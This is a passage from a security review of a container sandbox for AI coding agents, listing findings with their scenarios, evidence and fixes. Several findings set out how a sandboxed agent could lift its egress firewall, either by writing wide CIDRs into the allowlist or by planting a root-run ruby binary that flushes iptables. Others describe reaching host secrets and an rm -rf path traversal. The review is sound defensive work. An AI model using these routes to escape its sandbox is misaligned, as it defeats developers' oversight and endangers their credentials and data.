- What's wrong: `cp -a` keeps a top-level symlink, so the group gets a symlink pointing at the host directory. `add_mount_if_exists` then resolves it and bind-mounts the host's real directory `:rw`. That breaks two documented promises: "a sandboxed agent never writes to the developer's real host config" (tools.d) and "a container can no longer write the developer's real AWS/Azure credentials" (.aws/.azure/.kube). Dotfile managers and hand-made links (`~/.aws -> ~/Dropbox/aws`, `~/.config/dtctl -> ~/dotfiles/…`) are common. The tools.d seeding runs for any existing group the first time the tool is enabled, not only for `from:host`. With a relative link (GNU stow), the copied link dangles instead: the mount is skipped with a WARNING and the seed is retried on every launch.
- Failure scenario: `~/.aws` is a symlink to `/x/dotfiles/aws`, `aws-cli=ON`, and the group is bootstrapped `from:host`. The run args contain `-v /x/dotfiles/aws:/home/<u>/.aws:rw`, which is the host's real credentials, writable by the agent. The same happens with `dtctl=ON` and a symlinked `~/.config/dtctl`.
- Evidence: in a scratch HOME with `.aws` and `.config/dtctl` as absolute symlinks, the captured docker args held `…/symrepro/dotfiles/aws:/home/ihudak/.aws:rw` and `…/symrepro/dotfiles/dtctl:/home/ihudak/.config/dtctl:rw`. `~/.ai-containers/default/.config/dtctl` was a symlink to the host directory.
- Fix direction: copy the link's target, not the link (`cp -RL`, or `cp -a "$from/." "$dst/$p/"` after `mkdir`). Before mounting, refuse or warn when a group path is a symlink leading outside the group root.

### ENV-4: When the host user is root, or SANDBOX_UID=0, the agent shell is root, and restricted mode's allowlist becomes agent-writable
- **Status: FIXED (batch 2)** — `974faba`, hardened in `24b2223` and `7b55eb3` (checked before any side effect); T30, `tests/test-entrypoint-wiring.sh`. The entrypoint half needs a `./build.sh`.
- Severity: MEDIUM (needs a root host user or an explicit SANDBOX_UID=0). Confidence: CONFIRMED from code in triage — `setup_sandbox_user()` finds UID 0 via `getent passwd "$uid"` and adopts `root`; nothing refuses it. Not run end-to-end.
- Location: `sandbox.sh: \`launcher_ro_overlay()\`` accepts 0 (`must be numeric ids from 0 to 4294967294`); `-e SANDBOX_UID="${SANDBOX_UID:-$(id -u)}"`; `entrypoint.sh: \`setup_sandbox_user()\``; `exec capsh --drop=cap_net_admin,cap_net_raw --user="$sandbox_user"`.
- What's wrong: AGENTS.md describes a "non-root agent shell". The capability reasoning relies on `capsh --user=` clearing the capability sets on the root→user setuid ("the agent shell ends up with no capabilities at all"). If sandbox.sh runs as root (a root WSL distro, a root CI box, `sudo ./sandbox.sh`), `id -u` is 0. The UID-0 user already exists, the name matches, and capsh switches 0→0, so only NET_ADMIN/NET_RAW leave the bounding set. The agent keeps CAP_DAC_OVERRIDE, CAP_KILL and the rest, and it owns every root-owned file. In restricted mode that includes `/tmp/allowlist-cidrs.txt` and `/tmp/allowlist-domains.txt`, which the root refresh loop re-reads every 60 s and loads into the ipset. Writing `0.0.0.0/1` and `128.0.0.0/1` there opens all egress with no NET_ADMIN needed. The agent can also kill the capture daemon.
- Failure scenario: a root host user runs `./sandbox.sh restricted`. The agent appends two CIDRs to /tmp/allowlist-cidrs.txt, and within 60 s egress is unrestricted.
- Evidence: entrypoint and refresh code paths as cited. `refresh-ipset-allowlist.sh` runs `ipset add "$tmp_v4" "$line"` for each CIDR line, on a loop.
- Fix direction: refuse SANDBOX_UID=0 / SANDBOX_GID=0 in the launcher (and in the entrypoint, as defence in depth), or map a root host user to a fixed non-root UID with a warning.

### ENV-5: `host_checkout_preflight` never runs for the all-CRLF checkout it was written for, and it does not scan the baked `services.d/*.sh`
- **Status: FIXED (batch 2)** — `aa10888` (scan extended; the all-CRLF limit is now documented rather than claimed).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: `host-preflight.sh: \`host_crlf_files()\`` / `host_checkout_preflight()`, called after the caller has already been parsed and has sourced sandbox-common.sh and friends.
- What's wrong: the header says it "catches a checkout made before" `.gitattributes`, and AGENTS.md says it "refuses a CRLF script … (a Windows-side checkout)". In such a checkout every script is CRLF, so the shebang or the first line fails before the preflight can print its explanation. The guard only works for a tree where just some non-sourced files are CRLF. Separately, `services.d/*.sh` is COPYed into the image (`COPY services.d /etc/ai-containers/services.d`) but is not in the scanned set (`"$dir"/*.sh "$dir"/Dockerfile* … tools.d/*.conf allowlist-*.d/*.txt`), so a CRLF adapter gets baked and fails at runtime.
- Evidence: in a scratch copy with every `*.sh` converted to CRLF, `./sandbox.sh restricted` gave `env: 'bash\r': No such file or directory`, `bash ./sandbox.sh restricted` gave `line 2: set: pipefail: invalid option name`, and `./build.sh` gave the same `env` error. The preflight's message never appeared.
- Fix direction: reword the docs and header to the case it does cover (an individually edited fragment, descriptor or Dockerfile). Add `services.d/*.sh` (and `migrations/*.sh`) to the scan.

### ENV-6: A committed container.env can copy any host environment variable into the agent's shell with a bare `NAME` line
- **Status: FIXED (batch 2)** — `0343e6f` (`SANDBOX_ENV_PASSTHROUGH`); E13.
- Severity: LOW. Confidence: CONFIRMED (from code; documented docker behaviour)
- Location: `sandbox.sh: \`container_env_filter()\``. A bare NAME is forwarded "for docker to look up in this environment".
- What's wrong: the filter treats container.env as written by "whoever can commit to the project", yet it forwards a bare `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY` or `ANTHROPIC_API_KEY` line. docker fills these from the launching shell, so a host secret the launcher deliberately does not forward (build.sh's `GITHUB_TOKEN`, for example) reaches the agent. The agent can then use it or send it out through any allowlisted host. Only names the launcher passes with `-e` are refused.
- Fix direction: refuse bare names, or let them through only for names on an explicit allow-list (or behind an opt-in such as `SANDBOX_ENV_PASSTHROUGH=1` set in sandbox.local.env, never in a committed file).


## 3. Container-start runtime tools

### RT-1: link-default-ruby.sh runs agent-writable binaries as root, before the capability drop, so the restricted firewall can be lifted
- **Status: FIXED (batch 3)** — `38cf74e`. The probes run as the sandbox user (`runuser`, the user's HOME, `timeout -k 2 10`); as root with no user named, nothing from `~/.rvm` runs. The review of batch 3 found that `ln -sf` onto a link to a directory wrote inside it; every `ln` is now `-sfn` and a directory is never linked (`ce33ed9`). Tests run as root too (`59a7690`): `tests/test-ruby-wrapper.sh`; mutations 740 and 745 regenerated. Verified as root in ubuntu:24.04. Integration case 740 not re-run (needs an rvm image build).
- Triage: re-verified — in the `restricted)` arm of entrypoint.sh, `apply_restricted_firewall` runs first and `link_default_ruby` later calls the script with no `runuser`, before `exec capsh`; the script's `"$bin_dest/$b" --version` executes the symlinked rvm binaries.
- Severity: HIGH — Confidence: CONFIRMED (the execution is reproduced; that it runs as root is read from entrypoint.sh)
- Location: `link-default-ruby.sh: \`"$bin_dest/$b" --version >/dev/null 2>&1 && continue\``, called from `entrypoint.sh: \`link_default_ruby()\`` (`env RUBY_VERSIONS=... bash /usr/local/bin/link-default-ruby.sh` with no runuser)
- Introduced: 08ea799 (2026-08-05, before the window, but every container start still runs it)
- What's wrong: `link_default_ruby` runs as root in all three modes. In restricted mode the firewall is already up and the container still holds NET_ADMIN/NET_RAW. The script's verify step runs `ruby`, `gem`, `bundle`, `rake`, `irb` and `erb` with `--version`. Each of those is `~/.rvm/rubies/<default>/bin/<b>`, or wherever the agent-controlled `rubies/default` symlink leads. `~/.rvm` is the group's named volume, owned by the sandbox UID and writable by every agent in every container of that group.
- Failure scenario: an agent in any container of group G replaces `~/.rvm/rubies/ruby-3.3.6/bin/ruby` (or repoints `rubies/default`) with a script. On the next start of any restricted container in G, that script runs as root with NET_ADMIN, before `exec capsh`. It can run `iptables -P OUTPUT ACCEPT; iptables -F` or `ipset add`, or fork a root daemon that outlives the handover. The agent shell then has unrestricted egress while the banner says restricted. The planted binary is also the one that gets linked into `/usr/local/bin`, so a later `docker exec` as root that runs `ruby` executes it too.
- Evidence: I planted a `ruby` that logs `id -u`, then ran `RUBY_VERSIONS=3.3.6 bash link-default-ruby.sh <home> <dest>`. The log shows `planted ruby ran as uid=1000 args=--version`: the script executes whatever it finds there. In the entrypoint the same script runs as uid 0.
- Fix direction: never execute anything from `~/.rvm` as root. Run the `--version` probe as the sandbox user (`runuser -u "$sandbox_user" -- "$bin_dest/$b" --version`), or move the verify-and-repoint decision into rvm-reconcile.sh, which runs as the user, and keep root to `ln` only.

### RT-2: install-agent-skills.sh's stamp ignores which agents are enabled, so a newly enabled agent never gets skills
- **Status: FIXED (batch 3)** — `bfe1349` (one stamp line set per target: the cross-client skill and each agent); `tests/test-agent-skills.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `install-agent-skills.sh: \`current_stamp()\`` and `main()`'s `[ "$(cat "$STAMP" 2>/dev/null)" = "$want" ] && exit 0`
- Introduced: before the window (the file was touched in f028ce0)
- What's wrong: the stamp holds only `name=<tool version>`. `AI_AGENTS_ENABLED` is not part of it. The stamp lives in `~/.agents`, which is group-mounted and so shared by every project in the group.
- Failure scenario: project A (claude-code only) starts first in group G and writes `dtctl=0.25.0` to the stamp. Project B in G enables copilot, or A later turns copilot ON. Every later start sees an identical stamp and exits, so `dtctl skills install --for copilot` never runs. Copilot never gets the dtctl/dtmgd skills, silently, until a tool's version changes.
- Evidence: I used a fake `dtctl` that logs its arguments. The first run with `AI_AGENTS_ENABLED=claude-code` logged `--cross-client` and `--for claude`. The second run with `claude-code,copilot` printed nothing and logged no `--for copilot` call.
- Fix direction: include the sorted `AI_AGENTS_ENABLED` set in the stamp. Better still, record a stamp per agent, so a group shared by projects with different agent sets is not reinstalled on every alternation.

### RT-3: installed uv tools die when the image's Python changes, and the presence check never repairs them
- **Status: FIXED (batch 3)** — `ddaf54f` (a dangling `bin/python` behind the entry point triggers `--reinstall`; verified with uv 0.13.5); `tests/test-agent-tools-reconcile.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED (mechanism reproduced with a pyenv-style shim; not run in an image)
- Location: `agent-tools-reconcile.sh: \`install_uv()\`` — `if [[ -x "$UV_TOOL_BIN_DIR/$bin" ]]; then log "$bin already present"; return 0; fi`
- Introduced: 23e6ad6 (before the window). The window adds mkdocs and the fallback on top of it (17f7ca5, 69c3463).
- What's wrong: the first attempt uses the image's Python through pyenv's shims, and uv links the tool venv's `bin/python` to the versioned path behind the shim (`/opt/pyenv/versions/3.15.0/bin/python3`). `~/.ai-tools` outlives the image and is shared by every project in the group. Each build takes pyenv's newest patch release (`Dockerfile: \`sort -V | tail -1\``). So after a `./build.sh --no-cache` that picks up 3.15.1, or in a sibling project whose image was built on another date, that path no longer exists. The entry point in `uv/bin` is still an executable file, so `-x` passes and the reconcile logs "already present" for ever.
- Failure scenario: graphify and mkdocs are installed against 3.15.0. The image is rebuilt and now ships 3.15.1. Running `graphify` gives `bad interpreter: No such file or directory`. On every start the reconcile reports "graphify already present" and `link-agent-tools.sh` links the dead binary.
- Evidence: in my scratch area I ran `uv venv --no-managed-python` with a shim (`exec <dir>/pyv/versions/3.13.0/bin/python3`) first on PATH. `bin/python` became a link to `.../pyv/versions/3.13.0/bin/python3`. After `rm -rf pyv`, `[[ -x tool ]]` was still true, and running the tool failed with `bad interpreter` (rc 126).
- Fix direction: make the presence check prove the tool runs, for example that its venv's `bin/python` resolves or `"$UV_TOOL_BIN_DIR/$bin" --version` succeeds. If it does not, reinstall with `uv tool install --reinstall`, which then goes through the same previous-minor fallback.

### RT-4: the previous-minor fallback reads the PROJECT's Python, not the image's
- **Status: FIXED (batch 3)** — `ddaf54f` (the reconcile runs from `/`).
- Severity: MEDIUM — Confidence: CONFIRMED for `uv python find` (reproduced); PLAUSIBLE for the pyenv-shim effect on the first attempt
- Location: `agent-tools-reconcile.sh: \`py="$(uv python find --no-managed-python 2>/dev/null)"\``
- Introduced: 69c3463 (in the window)
- What's wrong: the reconcile runs in the entrypoint's working directory. That is `-w "$workdir"`, the project primary, and runuser keeps it. `uv python find` honours a `.python-version` and a `.venv` in that directory. `uv tool install` does not; I checked, and it ignores `.python-version`. So the two disagree. AGENTS.md says the retry version is "computed from the image's".
- Failure scenarios:
  - (a) The project has `.python-version` = `3.12`, which is very common, and the image only has 3.15. `uv python find` fails with "No interpreter found for Python 3.12", `major` stays empty, no retry happens, and graphify/mkdocs fail. This is exactly the wheel-lag case the fallback exists for.
  - (b) The project has a `.venv` on 3.13. The probe returns `.venv/bin/python`, and the retry runs on 3.12 instead of 3.14.
  - (c) Plausible: pyenv's `python3` shim also honours that `.python-version`. With a version pyenv lacks, the shim errors, and the first attempt's discovery skips past it, possibly to Ubuntu's own `/usr/bin/python3`, or to nothing.
- Evidence: in a scratch dir holding a `.venv`, `uv python find --no-managed-python` printed `<dir>/.venv/bin/python`. With `.python-version`=3.11 it printed `error: No interpreter found for Python 3.11 ...` (rc 2). `(cd / && uv python find --no-managed-python)` printed `/usr/bin/python3`. The hermetic test's fake `uv` ignores the cwd, so it cannot see this.
- Fix direction: `cd /` (not `$HOME`, which in the host group may hold its own pin) at the top of agent-tools-reconcile.sh, or at least around the probe and the uv calls.

### RT-5: the leftover-npm-Claude fallback cannot fire in any named group, and its test models a state that cannot occur
- **Status: FIXED (batch 3)** — `16266d7`, aligned with `install_claude_native` in `ce33ed9` (the highest version must be executable); the test now makes the mounted directories.
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `agent-tools-reconcile.sh: \`! -d "$HOME/.local/share/claude" && -x "$npm_bin/claude"\``; `sandbox.sh: \`"$group_root/.local/share/claude" "$group_root/.local/state/claude"\`` (`install -d`, then mounted)
- Introduced: 2354abc (before the window). 33c2b44 in the window edited the condition.
- What's wrong: for every non-host group with claude-code ON, sandbox.sh creates and mounts `~/.local/share/claude`. So `! -d` is always false in the container, even when the native install failed. `~/.local/bin/claude` is then never pointed at the leftover npm copy, although the comment says "Claude Code plugins expect ~/.local/bin/claude". `/usr/local/bin/claude` still works through `link-agent-tools.sh`'s own fallback.
- Failure scenario: an old group carries npm Claude, and the native install fails (offline, or claude.ai unreachable). There is no `~/.local/bin/claude`, and plugins and hooks that call that path fail. `tests/test-agent-tools-reconcile.sh`'s "leftover npm claude is used" case passes only because it never creates the mounted directory that sandbox.sh always creates.
- Fix direction: key the condition on "no executable version under `~/.local/share/claude/versions`", the same predicate `install_claude_native` uses, and pre-create the directory in the test.

### RT-6: Copilot and Gemini run under whichever node is active, so `nvm use 20` can break them
- **Status: FIXED (batch 3)** — `77f265e` (a wrapper runs each npm node-script CLI under the default node; `PATH` untouched), bounded read and no `timeout(1)` dependency in `ce33ed9`/`59a7690`; `tests/test-link-agent-tools.sh`.
- Severity: LOW — Confidence: PLAUSIBLE (based on the upstream `engines` minimums; not run)
- Location: `link-agent-tools.sh: \`"copilot:copilot:$home_root/npm/bin/copilot"\`` (a plain symlink to npm's `#!/usr/bin/env node` launcher)
- Introduced: 23e6ad6 / 33c2b44
- What's wrong: 259aeb7 in the window fixed this class for qmd: it pins qmd to the default node because `nvm use 20` cannot run it. The npm-installed agent CLIs were left as plain symlinks. Copilot CLI requires Node 22 or later.
- Failure scenario: a project with `node=20` runs `nvm use 20` in its shell, then `copilot`. It runs on node 20 and refuses to start, or crashes.
- Fix direction: write a wrapper for the npm agent CLIs that runs them under the node they were installed with, the same way link-node-globals.sh `--pin` does for qmd.

### RT-7: updating Codex/Gemini on every start rewrites a package that sibling containers may be running
- **Status: FIXED (batch 3)** — `6836894` (reinstalled only when `npm view` differs from `npm ls`; an unreachable registry keeps the installed copy; parsing verified with npm 10).
- Severity: LOW — Confidence: PLAUSIBLE
- Location: `agent-tools-reconcile.sh: \`update_npm()\``
- What's wrong: flock serialises only the reconcile scripts, not the tools themselves. The leftover-Claude comment refuses to delete the npm copy because "other containers in the same group may be running against it right now". Yet `npm install -g --prefix ~/.ai-tools/npm @google/gemini-cli` re-extracts the package in place on every start of any container in the group.
- Failure scenario: Gemini is running in container A. Container B in the same group starts and replaces `lib/node_modules/@google/gemini-cli`, and a module A's node process loads lazily mid-replacement is missing or a different version.
- Fix direction: skip the reinstall when the installed version already equals `npm view <pkg> version`, which also saves the ~7 s per start. Otherwise accept the risk and document it.


### RT-8: The user-level steps before the capability drop can leave a process with the full bounding set
- **Status: FIXED** (2026-10-28). Every user-level step before the final `capsh` starts through `setpriv --bounding-set=-net_admin,-net_raw --no-new-privs --` in front of its `runuser`: `entrypoint.sh: as_sandbox_user()` (the skill installs, both reconciles, the git config), the services `start` in `run_services()`, and `link-default-ruby.sh: probe()`. Root drops the two capabilities from the bounding set, then `runuser` switches user as before, so its environment handling is unchanged. Measured in ubuntu:24.04 run with `--cap-add NET_ADMIN --cap-add NET_RAW`: `runuser` alone gives `CapBnd: a80435fb, NoNewPrivs: 0`; through `setpriv`, `a80405fb` (bits 12 and 13 gone) and `NoNewPrivs: 1`, `runuser` and its PAM session work under it, and a `setsid` child keeps the reduced set. Hermetic: `tests/test-entrypoint-wiring.sh` runs `as_sandbox_user` and the services start with a recording `setpriv`, `tests/test-ruby-wrapper.sh` the probes; each red on the old code. The integration corpus runs the real entrypoint through these steps in every mode.
- Severity: LOW. Confidence: CONFIRMED that the process survives; no route to root found in the ubuntu:24.04 base (its setuid binaries need a password; root's is locked). The full image's `dumpcap` file capabilities were not checked.
- Location: entrypoint.sh: `as_sandbox_user()`; link-default-ruby.sh: `probe()`.
- What's wrong: these steps run as the sandbox user via `runuser`, before `exec capsh` removes NET_ADMIN/NET_RAW from the bounding set. A `setsid` daemon forked there escapes `timeout` and keeps that bounding set into the session. A setuid-root or file-capability binary would then grant the capabilities back.
- Fix direction: run every user-level step before the drop through `setpriv --no-new-privs --bounding-set -net_admin,-net_raw` (or `capsh --drop=… --user=…`), so nothing started there can regain them.

### RT-9: Nits left by the batch 3 reviews
- **Status: FIXED** (2026-10-28). Fixed: the skills stamp is read, the skills installed and the stamp rewritten under an `flock` on `~/.agents/.ai-containers-skills.lock` (`install-agent-skills.sh: take_lock()`), bounded so it never holds up a start — no `flock`, a lock path that is a link or not a regular file (a FIFO would block the open), or a holder past 60 s means installing unlocked with a `NOTE:` — and the tools it runs do not inherit the lock's descriptor. Its review found the first version unbounded and silent (an agent holding the lock, or a FIFO at its path, hung every later start of the group), sending all later stderr to `/dev/null`, and its tests failing on a Mac (no `flock`) and timing the wait in whole seconds. `tests/test-agent-skills.sh` now has the holder mark when it holds and releases the lock and requires the installer to finish after the release and say it waited; a holder past the wait (`AI_CONTAINERS_SKILLS_LOCK_WAIT=1`) and a FIFO at the lock path must not hold the start; each red on the old code every time, and each with its own guard removed. The two-projects-together check is a race on the old code (red about one run in three). Without `flock` they print a SKIP. The test gaps are closed: `tests/test-ruby-wrapper.sh` runs the non-root, no-probe-user branch of `probe()` and requires both of a probe's outcomes (a broken binstub repaired, a working one kept), red with that branch made to fail; the working-binstub case now has a wrapper for it to refuse; `tests/test-link-agent-tools.sh` gives `node_script` a shebang whose `node` lies past byte 256 (red with an unbounded read) and an executable FIFO where the script should be, under `p_timeout` and required to take under 3 s (red without the regular-file test: `node_script`'s own timeout took 5 s). The two left open are fixed too (2026-10-29): instead of `ln -sfT`, which BSD `ln` lacks, `link-agent-tools.sh` and `link-default-ruby.sh` skip a real directory at the destination with a `WARNING:` and link the rest (a container start never fails there), and `link-node-globals.sh`, at build time, already refused it as a file it did not make, now with a test; and a NUL in a shebang ends the line, as it does for the kernel, so `#!\0/usr/bin/node` is no longer a node script. Tests in `tests/test-link-agent-tools.sh`, `tests/test-ruby-wrapper.sh` and `tests/test-link-node-globals.sh`; the first two red on the old code. Their review's gaps are tests now: a directory where a wrapper goes (its mode untouched), a link to a directory there (replaced, not entered), a second start rewriting its own wrapper, the ruby hook and the refused name not logged as linked; each red with the regression the review named. The helper is `link_bin`, not `link`, which shadowed coreutils' `link(1)`.
- Severity: NIT
- The skills stamp is rewritten without a lock: two containers of a group starting together can lose each other's lines, which costs one harmless reinstall.
- `ln -sfn` still makes the link inside a real directory standing at `/usr/local/bin/<name>`. Only root could make one and nothing does; `ln -sfT` would close it.
- Stripping NULs from the shebang read makes `#!\0/usr/bin/node` count as a node script; harmless, the wrapper runs as the user.
- Test gaps: the non-root, no-probe-user branch of `probe()` is no longer exercised; no case checks that a binstub that runs stays a direct link when a wrapper for it exists (pre-existing); no case covers the bounded read in `node_script` (FIFO, oversize file).

## 4. Host lifecycle scripts

### PRJ-1: `group.sh rm` never validates the group name, so `rm -rf` reaches outside `~/.ai-containers`
- **Status: FIXED (batch 4)** — `c548b0e` (`validate_group_name` before any path); `tests/test-group-lifecycle.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `group.sh: \`cmd_rm()\`` (`local dir="$groups_root/$name"` … `rm -rf "$dir"`)
- Introduced: pre-window (group.sh creation). The window touched group.sh through sandbox-common (c029d8a).
- What's wrong: every other entry point runs `validate_group_name` (`^[a-z0-9][a-z0-9-]{0,31}$`), but `cmd_rm` only refuses `host` and the empty string. The name is spliced into a path and handed to `rm -rf`, so a name containing `/` or `..` leaves `~/.ai-containers`. The rvm volume name is sanitised separately (`/`→`_`), so even for a near-valid name like `default/` the directory and the volume no longer refer to the same group: the directory is removed and the group's rvm volume is orphaned.
- Failure scenario: `./group.sh rm ../dev --yes` runs `rm -rf ~/.ai-containers/../dev`, which deletes `~/dev`. Without `--yes` the user gets one `[y/N]` prompt showing an unnormalised path (`…/.ai-containers/../dev`). The only safety is that `rm` itself refuses a path whose last component is `.` or `..`.
- Evidence: reproduced with a fake HOME: `HOME=$S/home bash group.sh rm ../victim --yes` printed `Removed directory …/home/.ai-containers/../victim`, and `$S/home/victim` (with its data) was gone.
- Fix direction: call `validate_group_name "$name"` (or `valid_group_name`, which returns instead of exiting) at the top of `cmd_rm`, before any path is built.

### PRJ-2: Sync re-enables a component the project turned off by commenting it out, as sandbox.conf tells users to do
- **Status: FIXED (batch 4)** — `a3ff97a` (a `#key=` / `# key=` line counts as the project's; an indented example does not); `tests/test-sandbox-schema.sh`.
- **Duplicate of DOC-1** — two reviewers found it independently; fix once (batch 4).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sync-to-projects.sh: \`reconcile_sandbox_conf()\`` (`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")`)
- Introduced: pre-window reconcile design (24e093a era). 0c7a870 in the window reworked the same append path.
- What's wrong: the header of sandbox.conf says "Boolean components: set to ON to include, OFF (or comment out) to exclude." The reconcile decides that a key is missing when no line starts with `key=`. A commented-out `#copilot=ON` therefore counts as missing, and the key is appended with the upstream default. Upstream ships `copilot=ON`, `claude-code=ON`, `github-cli=ON` and `bun=ON`.
- Failure scenario: a project disables Copilot the documented way (`#copilot=ON`). The next `./sync-to-projects.sh` appends `copilot=ON` under "New options synced from upstream". The next build installs Copilot again, adds its allowlist fragment (`github-copilot.txt`) to the restricted-mode allowlist, and mounts `~/.copilot`. The only output is a one-line "appended 2 new key(s)" message.
- Evidence: reproduced: a project sandbox.conf with `#copilot=ON` and `# claude-code=ON`, then `bash sync-to-projects.sh $P` → `Reconciled sandbox.conf: appended 2 new key(s): copilot claude-code`, and the file now ends with `copilot=ON` and `claude-code=ON`.
- Fix direction: treat a commented `^#[[:space:]]*key=` line as "the project has this key" and do not append it, or write OFF for it. Separately, drop "or comment out" from the sandbox.conf header.

### PRJ-3: Re-running project-init.sh silently resets `SANDBOX_MODE` (restricted → open) and `SANDBOX_WORKDIR`, with no backup
- **Status: FIXED (batch 4)** — `1e25ddf` (keeps `SANDBOX_MODE` and added keys, backs up `sandbox.env`), `2ee809b` (a non-portable `SANDBOX_WORKDIR` is dropped with a NOTE rather than moved into `sandbox.local.env`: the automated security review of `1e25ddf` flagged that as laundering committed config into trusted config), `b681c97` (lines matched as the loader reads them); `tests/test-project-init.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `project-init.sh: \`SANDBOX_MODE=open\`` in the unconditional `} > "${dest}/sandbox.env"` heredoc. The comment beside it reads `unlike sandbox.env (whose values are all re-prompted)`.
- Introduced: 8555b1d / 3853c17 (pre-window). project-init.sh was touched in the window (9e67226, aeb218a, f8414ab).
- What's wrong: on re-init, sandbox.env is overwritten unconditionally. `SANDBOX_MODE` and `SANDBOX_WORKDIR` are never prompted; they are hardcoded to `open` and `..`. Any other key a user added (`PREVIEW_PORTS`, `SELINUX_LABEL`, `CONTAINER_NOFILE`, …) is also dropped. sandbox.local.env gets a `.pre-init` backup for exactly this reason, but sandbox.env gets none, so the code comment's justification is false. In the default layout `.ai-containers/` is gitignored, so `git status` shows nothing either.
- Failure scenario: a project's sandbox.env has `SANDBOX_MODE=restricted` and `SANDBOX_WORKDIR=@app`. The user re-runs `project-init.sh` and accepts every default (for example, to pick a different group). The next `./runme.sh` launches in **open** mode: unrestricted egress and no firewall, with the primary mount changed. Nothing reports the change.
- Evidence: reproduced: piped answers into a re-init of a project whose sandbox.env held `SANDBOX_MODE=restricted`, `SANDBOX_WORKDIR=@app` and `SELINUX_LABEL=keep`. Afterwards the file held `SANDBOX_MODE=open` and `SANDBOX_WORKDIR=..`, `SELINUX_LABEL` was gone, and no backup existed.
- Fix direction: when sandbox.env already exists, keep its existing `SANDBOX_MODE`/`SANDBOX_WORKDIR`, offer them as prompt defaults, and carry unknown keys forward. At minimum, back it up as is done for sandbox.local.env.

### PRJ-4: project-init.sh adds `/.ai-containers/` to `.gitignore` even in a project that tracks `.ai-containers/`
- **Status: FIXED (batch 4)** — `b0d18f6` (init has sync's tracked-layout check; a test compares the two copies).
- Severity: LOW — Confidence: CONFIRMED
- Location: `project-init.sh: \`ensure_ai_containers_ignored()\``. Compare with the same-named function in sync-to-projects.sh, which has `git -C "$project_path" ls-files -- .ai-containers`.
- Introduced: 78a6175 added the tracked-layout guard to sync only (pre-window).
- What's wrong: the two copies of the function have drifted. Sync never adds the ignore rule when any file under `.ai-containers/` is tracked; init still does. In a project that deliberately versions its `.ai-containers/` (the layout AGENTS.md documents: "Remove the line to version the portable config"), re-running init adds the rule back. Every file that is not yet tracked is then hidden from `git add`, which is what the sync-side guard exists to prevent.
- Evidence: reproduced: a git project with `.ai-containers/sandbox.env` committed, then re-init. `git status` showed `?? .gitignore` containing `/.ai-containers/`.
- Fix direction: keep one copy of the function, with the `ls-files` guard, in a sourced file, or add the guard to project-init's copy.

### PRJ-5: Repo/rvm volume discovery uses unanchored Docker `name=` filters; `rm`, `reset` and `gc` delete volumes belonging to other repos or prefixes
- **Status: FIXED (batch 4)** — `ecc4893` (exact prefix match in bash, base/working copy by label, `--` refused in new names); the review of batch 4 found it took any unclassifiable volume for a working copy, so `gc` deleted a base volume under a nested prefix — classified positively in `b681c97`. `tests/test-repo-destructive.sh`; mutation 620 regenerated.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox-common.sh: \`repo_workcopy_volumes()\``, `sandbox-common.sh: \`repo_base_volumes()\``, `sandbox-common.sh: \`rvm_volumes()\``, `repo.sh: \`cmd_rm()\`` / `repo.sh: \`reset_one()\`` (`docker volume ls --quiet --filter "name=${vol}--wc-"`)
- Introduced: pre-window (label/registry design). These paths are called by the window's reset/rm code.
- What's wrong: Docker's volume `name=` filter is an unanchored regex. There are two consequences.
  - (a) `validate_repo_name` allows `--`, so a repo named `app--wc-ui` has the base volume `ai-containers-repo-app--wc-ui`. That volume matches the working-copy filter for repo `app`. `repo.sh rm app`, `repo.sh reset app` (which removes working copies without listing them in the prompt) and `repo.sh gc` all delete it as if it were a working copy. `repo_base_volumes` also hides it from `list`/`reindex` (`grep -v -- '--wc-'`).
  - (b) With `REPO_VOLUME_PREFIX`, which the docs suggest setting to `$IMAGE_NAME`, the prefix `prj` matches `myprj-repo-*`. `gc` under one prefix therefore deletes another prefix's working copies, and `list`/`reindex` adopt another prefix's base volumes. A prefix containing `.` (which sanitising allows) matches any character. `rvm_volumes` has the same shape, and `group.sh gc` deletes what it finds.
- Failure scenario: `REPO_VOLUME_PREFIX=prj ./repo.sh gc --yes` removed `myprj-repo-lib--wc-t`, a working copy that "may hold UNCOMMITTED work" belonging to the other prefix. `./repo.sh rm app --yes` removed the base volume of the separately registered repo `app--wc-ui`, which `list` then reported as MISSING.
- Evidence: reproduced both against the real daemon (Docker 29.7.2) using scratch volumes, which were removed afterwards.
- Fix direction: anchor the filters (`name=^${prefix}-repo-`, `name=^${vol}--wc-`), then confirm each result by its labels or an exact prefix match in bash. Forbid `--` in repo names, or use a working-copy separator that `validate_repo_name` cannot produce.

### PRJ-6: ai-containers-report.sh reads the LAST value of a key, but the launcher uses the FIRST, so the network mode can be misreported
- **Status: FIXED (batch 4)** — `0940160` (first value, literal values, `UNSET (usage)`), group column in `b681c97`; `tests/test-report.sh`. Two edge cases remain in REPO-12.
- Severity: LOW — Confidence: CONFIRMED
- Location: `ai-containers-report.sh: \`env_var()\`` (`END { if (val != "") print val }`, last match wins) vs `sandbox-common.sh: \`load_env_defaults()\`` (`[[ -n "${!key+x}" ]] && continue`, first match wins within a file)
- Introduced: pre-window. AGENTS.md says the report resolves "the same precedence sandbox-common.sh applies".
- What's wrong: when a key appears twice in sandbox.env, the report and the launcher disagree. The natural way to override `SANDBOX_MODE=open`, which project-init writes, is to append a line, and that triggers it. The report also strips a trailing `# comment` and single quotes, which the launcher treats as part of the value. It also labels an unset mode `DEFAULT-OPEN`, but sandbox.sh falls back to `usage` (`command="${1:-${SANDBOX_MODE:-usage}}"`) and does not launch at all.
- Failure scenario: sandbox.env contains `SANDBOX_MODE=open` and later `SANDBOX_MODE=restricted`. The report shows `RESTRICTED`; the launcher runs **open**.
- Evidence: reproduced: the report printed `RESTRICTED`, and the same file loaded through `load_env_defaults` gave `SANDBOX_MODE=open`.
- Fix direction: make `env_var` keep the first match and the same literal value semantics as `load_env_defaults`, and replace `DEFAULT-OPEN` with something like `UNSET (usage)`.

### PRJ-7: The `repo.sh gc` tests fail under glibc `en_US.UTF-8`; this is a test bug, not a product bug
- **Status: FIXED (batch 7)** — with TST-1: `142dc84`, and `aa0c70b` for the second sort in the same file.
